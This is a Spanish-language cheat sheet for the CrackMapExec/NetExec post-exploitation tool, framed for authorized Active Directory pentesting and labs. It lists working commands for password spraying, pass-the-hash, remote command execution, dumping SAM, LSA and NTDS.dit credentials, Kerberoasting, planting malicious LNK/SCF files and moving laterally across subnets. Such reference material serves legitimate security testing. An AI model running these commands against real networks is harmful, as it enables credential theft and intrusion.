# CrackMapExec (NetExec) — Network Enumeration & Lateral Movement

Herramienta de post-exploitation para enumerar y atacar redes Windows/AD. Soporta SMB, WinRM, LDAP, MSSQL, SSH, RDP, WMI.

**Nota:** CrackMapExec fue forked a **NetExec (nxc)**. Los comandos son intercambiables (`crackmapexec` → `nxc`).

**Contexto:** Uso en pentesting autorizado de AD, CTFs, y laboratorios de seguridad.

---

## Protocolos Soportados

```bash
crackmapexec smb     # SMB (445) — principal
crackmapexec winrm   # WinRM (5985/5986)
crackmapexec ldap    # LDAP (389/636)
crackmapexec mssql   # MSSQL (1433)
crackmapexec ssh     # SSH (22)
crackmapexec rdp     # RDP (3389)
crackmapexec wmi     # WMI (135)
crackmapexec ftp     # FTP (21)
```

---

## SMB — Enumeración y Ataque

### Descubrimiento y Fingerprinting
```bash
# Enumerar hosts SMB en red
crackmapexec smb 192.168.1.0/24

# Info de host específico
crackmapexec smb <target>

# Desde archivo de targets
crackmapexec smb targets.txt
```

### Autenticación
```bash
# Password
crackmapexec smb <target> -u 'user' -p 'password'

# Hash NTLM (Pass-the-Hash)
crackmapexec smb <target> -u 'user' -H '<NTLM_hash>'

# Hash completo LM:NTLM
crackmapexec smb <target> -u 'user' -H 'LM_hash:NTLM_hash'

# Con dominio
crackmapexec smb <target> -u 'user' -p 'password' -d 'target.local'

# Local auth (no dominio)
crackmapexec smb <target> -u 'user' -p 'password' --local-auth

# Kerberos
crackmapexec smb <target> -u 'user' -p 'password' -k

# Null session
crackmapexec smb <target> -u '' -p ''

# Guest
crackmapexec smb <target> -u 'guest' -p ''
```

### Password Spraying
```bash
# Un password contra múltiples usuarios
crackmapexec smb <target> -u users.txt -p 'Password123!' --continue-on-success

# Múltiples passwords (cuidado con lockout)
crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success

# No fail (no mostrar intentos fallidos)
crackmapexec smb <target> -u users.txt -p 'Password123!' --no-bruteforce
```

**Output key:** `[+]` = success, `(Pwn3d!)` = admin access

### Enumeración con Acceso
```bash
# Enumerar shares
crackmapexec smb <target> -u 'user' -p 'password' --shares

# Enumerar usuarios
crackmapexec smb <target> -u 'user' -p 'password' --users

# Enumerar grupos
crackmapexec smb <target> -u 'user' -p 'password' --groups

# Listar sesiones activas
crackmapexec smb <target> -u 'user' -p 'password' --sessions

# Listar discos
crackmapexec smb <target> -u 'user' -p 'password' --disks

# Listar usuarios logueados
crackmapexec smb <target> -u 'user' -p 'password' --loggedon-users

# RID brute force (enumerar usuarios sin creds válidas)
crackmapexec smb <target> -u 'guest' -p '' --rid-brute 10000

# Password policy
crackmapexec smb <target> -u 'user' -p 'password' --pass-pol

# Buscar archivos en shares
crackmapexec smb <target> -u 'user' -p 'password' -M spider_plus
crackmapexec smb <target> -u 'user' -p 'password' -M spider_plus -o READ_ONLY=False
```

### Ejecución de Comandos
```bash
# Ejecutar comando (auto-selecciona método)
crackmapexec smb <target> -u 'admin' -p 'password' -x 'whoami'

# PowerShell
crackmapexec smb <target> -u 'admin' -p 'password' -X 'Get-Process'

# Forzar método de ejecución
crackmapexec smb <target> -u 'admin' -p 'password' -x 'whoami' --exec-method smbexec
crackmapexec smb <target> -u 'admin' -p 'password' -x 'whoami' --exec-method wmiexec
crackmapexec smb <target> -u 'admin' -p 'password' -x 'whoami' --exec-method atexec
crackmapexec smb <target> -u 'admin' -p 'password' -x 'whoami' --exec-method mmcexec
```

### Dump de Credenciales
```bash
# SAM (hashes locales)
crackmapexec smb <target> -u 'admin' -p 'password' --sam

# LSA secrets
crackmapexec smb <target> -u 'admin' -p 'password' --lsa

# NTDS.dit (todos los hashes del dominio — requiere DA)
crackmapexec smb <DC_IP> -u 'administrator' -p 'password' --ntds

# NTDS con historia de passwords
crackmapexec smb <DC_IP> -u 'administrator' -p 'password' --ntds --history

# LAPS passwords
crackmapexec smb <target> -u 'user' -p 'password' -M laps

# gMSA passwords
crackmapexec ldap <DC_IP> -u 'user' -p 'password' -M gmsa
```

---

## LDAP — Enumeración de AD

```bash
# Enumerar usuarios
crackmapexec ldap <DC_IP> -u 'user' -p 'password' --users

# Grupos
crackmapexec ldap <DC_IP> -u 'user' -p 'password' --groups

# AS-REP Roastable users
crackmapexec ldap <DC_IP> -u 'user' -p 'password' --asreproast asrep_hashes.txt

# Kerberoastable users
crackmapexec ldap <DC_IP> -u 'user' -p 'password' --kerberoasting kerb_hashes.txt

# Buscar descriptions con passwords
crackmapexec ldap <DC_IP> -u 'user' -p 'password' -M get-desc-users

# Enumerar trusts
crackmapexec ldap <DC_IP> -u 'user' -p 'password' -M enum_trusts

# MAQ (Machine Account Quota)
crackmapexec ldap <DC_IP> -u 'user' -p 'password' -M maq

# ADCS (encontrar CAs)
crackmapexec ldap <DC_IP> -u 'user' -p 'password' -M adcs

# Bloodhound collection
crackmapexec ldap <DC_IP> -u 'user' -p 'password' --bloodhound -ns <DC_IP> -c All
```

---

## WinRM — PowerShell Remoting

```bash
# Verificar acceso WinRM
crackmapexec winrm <target> -u 'user' -p 'password'

# Ejecutar comando
crackmapexec winrm <target> -u 'user' -p 'password' -x 'whoami'

# PowerShell
crackmapexec winrm <target> -u 'user' -p 'password' -X 'Get-Process'
```

---

## MSSQL

```bash
# Verificar acceso
crackmapexec mssql <target> -u 'sa' -p 'password'

# Ejecutar query
crackmapexec mssql <target> -u 'sa' -p 'password' -q 'SELECT @@version'

# Ejecutar comando del sistema (xp_cmdshell)
crackmapexec mssql <target> -u 'sa' -p 'password' -x 'whoami'

# Habilitar xp_cmdshell
crackmapexec mssql <target> -u 'sa' -p 'password' -M mssql_priv
```

---

## Módulos Útiles

```bash
# Listar módulos disponibles
crackmapexec smb -L
crackmapexec ldap -L

# Módulos destacados
-M spider_plus      # Crawl shares recursivamente
-M laps             # Extraer LAPS passwords
-M gmsa             # Extraer gMSA passwords
-M petitpotam       # Trigger PetitPotam
-M zerologon        # Check Zerologon (CVE-2020-1472)
-M nopac            # Check NoPac/SAMAccountName (CVE-2021-42278)
-M printnightmare   # Check PrintNightmare
-M webdav           # Check WebDAV
-M enum_av          # Enumerar antivirus instalado
-M slinky           # Crear LNK malicioso en share
-M drop-sc          # Crear SCF malicioso en share
-M get-desc-users   # Buscar passwords en description de usuarios
-M adcs             # Enumerar AD Certificate Services
-M maq              # Machine Account Quota
-M enum_trusts      # Enumerar domain trusts
```

---

## Output y Logging

```bash
# Guardar output
crackmapexec smb <target> -u 'user' -p 'password' --shares 2>&1 | tee output.txt

# CME database (historial de credentials/hosts)
cmedb                    # Abrir database
cmedb> hosts             # Listar hosts escaneados
cmedb> creds             # Listar credenciales encontradas

# Export formato grepable
crackmapexec smb <target> -u 'user' -p 'password' --shares --export shares.csv
```

---

## Patrones de Uso Comunes

### Mapeo Inicial de AD
```bash
# 1. Descubrir hosts
crackmapexec smb 10.10.10.0/24 | tee hosts.txt

# 2. Null session enum
crackmapexec smb <DC_IP> -u '' -p '' --users --shares

# 3. Password policy (antes de spray)
crackmapexec smb <DC_IP> -u 'user' -p 'password' --pass-pol

# 4. Password spray con cuidado
crackmapexec smb <DC_IP> -u users.txt -p 'Season2026!' --continue-on-success

# 5. Enumerar con credenciales válidas
crackmapexec smb <DC_IP> -u 'user' -p 'password' --shares --users --groups
```

### Lateral Movement
```bash
# Probar credenciales en todo el rango
crackmapexec smb 10.10.10.0/24 -u 'admin' -p 'password' --continue-on-success

# Pass-the-Hash en todo el rango
crackmapexec smb 10.10.10.0/24 -u 'admin' -H '<hash>' --continue-on-success

# Buscar donde tienes admin
crackmapexec smb 10.10.10.0/24 -u 'admin' -p 'password' | grep "Pwn3d"
```

---

## Tips

- **`(Pwn3d!)` es tu indicador clave** — significa que tienes admin local en ese host
- **Siempre verificar password policy antes de spray** — un lockout arruina el engagement
- **`--continue-on-success`** — sin este flag, CME para al primer éxito
- **`--local-auth`** — usar cuando las creds son locales, no de dominio
- **CME database** — guarda historial de todo, útil para no repetir trabajo
- **spider_plus** — invaluable para encontrar archivos interesantes en shares
- **NetExec (nxc)** — es el sucesor de CME, misma sintaxis, más mantenido
